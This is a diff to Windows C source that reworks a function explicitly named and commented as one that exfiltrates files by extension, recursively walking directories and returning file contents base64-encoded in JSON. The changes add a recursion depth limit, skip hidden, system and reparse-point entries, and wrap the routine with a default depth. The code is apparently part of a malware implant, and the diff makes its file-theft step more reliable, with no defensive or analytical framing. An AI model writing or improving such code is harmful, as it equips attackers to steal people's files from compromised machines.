@@ -150,7 +150,7 @@ BOOL matches_any_extension(const char* filename, const char* extensions) {
 
 // Recursive function to scan directory and exfiltrate files by extension
 // Returns JSON array of exfiltrated files (base64-encoded)
-char* exfiltrate_directory_by_extension(const char* directory, const char* extensions, int* file_count) {
+char* exfiltrate_directory_by_extension_internal(const char* directory, const char* extensions, int* file_count, int depth, int max_depth) {
     WIN32_FIND_DATAA find_data;
     HANDLE hFind = INVALID_HANDLE_VALUE;
     char search_path[MAX_PATH];
@@ -160,6 +160,13 @@ char* exfiltrate_directory_by_extension(const char* directory, const char* exten
     size_t result_len = 0;
     int count = 0;
     const int max_files = 100;  // Limit to prevent memory issues
+    
+    // Check depth limit to prevent stack overflow
+    if (depth >= max_depth) {
+        *file_count = 0;
+        const char *empty = "[]";
+        return base64_encode((unsigned char*)empty, strlen(empty));
+    }
     
     if (!directory || !extensions || !file_count) {
         const char *error = "{\"error\":\"Invalid parameters for directory scan\"}";
@@ -199,6 +206,16 @@ char* exfiltrate_directory_by_extension(const char* directory, const char* exten
             continue;
         }
         
+        // Skip hidden and system files/directories to avoid access issues
+        if (find_data.dwFileAttributes & (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
+            continue;
+        }
+        
+        // Skip reparse points (junctions, symlinks) to prevent infinite loops
+        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
+            continue;
+        }
+        
         // Build full path
         snprintf(full_path, sizeof(full_path), "%s\\%s", directory, find_data.cFileName);
         
@@ -207,7 +224,7 @@ char* exfiltrate_directory_by_extension(const char* directory, const char* exten
             // Recursive directory scan
             if (count < max_files) {
                 int subdir_count = 0;
-                char* subdir_result = exfiltrate_directory_by_extension(full_path, extensions, &subdir_count);
+                char* subdir_result = exfiltrate_directory_by_extension_internal(full_path, extensions, &subdir_count, depth + 1, max_depth);
                 
                 if (subdir_result && subdir_count > 0) {
                     // Parse and merge results (skip the outer [ and ])
@@ -311,6 +328,12 @@ char* exfiltrate_directory_by_extension(const char* directory, const char* exten
     free(result);
     
     return encoded_result;
+}
+
+// Wrapper function with default depth limit
+char* exfiltrate_directory_by_extension(const char* directory, const char* extensions, int* file_count) {
+    const int max_depth = 10;  // Maximum recursion depth (10 levels deep)
+    return exfiltrate_directory_by_extension_internal(directory, extensions, file_count, 0, max_depth);
 }
 
 // Helper function to get current user's home directory
